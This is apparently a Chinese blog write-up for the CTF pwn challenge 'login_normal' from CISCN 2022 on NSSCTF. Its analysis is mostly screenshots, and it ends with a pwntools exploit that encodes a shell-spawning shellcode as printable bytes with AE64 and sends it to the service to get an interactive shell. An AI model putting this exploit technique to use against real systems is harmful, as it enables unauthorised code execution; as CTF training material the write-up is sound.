---
title: NSSCTF-CISCN-2022-login_normal 题解
date: 2026-02-11 21:12:00
tags: 
    - shellcode
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/2350)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-login_normal/checksec.png)

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-login_normal/main.png)

#### vuln

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-login_normal/vuln1.png)

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-login_normal/vuln2.png)

#### root

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-login_normal/root.png)

#### shellcode

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/CISCN-2022-login_normal/shellcode.png)

有 shellcode 执行

### 攻击思路

读懂代码后发现难点主要在构造 printable shellcode 上

今天状态不好，没有深入研究，用的 ae64 ，之后会自己试着搓一个看看

### exp

```python
from pwn import *
from ae64 import AE64

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

if debug:
	io = process('./service')
else:
	io = remote('node5.buuoj.cn', 26980)

def attack():
	payload = b'opt:1\nmsg:ro0t \n\n'
	io.sendafter(b'>>> ', payload)
	sc = AE64().encode(asm(shellcraft.sh()), 'rdx')
	payload = b'opt:2\nmsg:' + sc + b' \n\n'
	io.sendafter(b'>>> ', payload)
	io.interactive()

attack()
```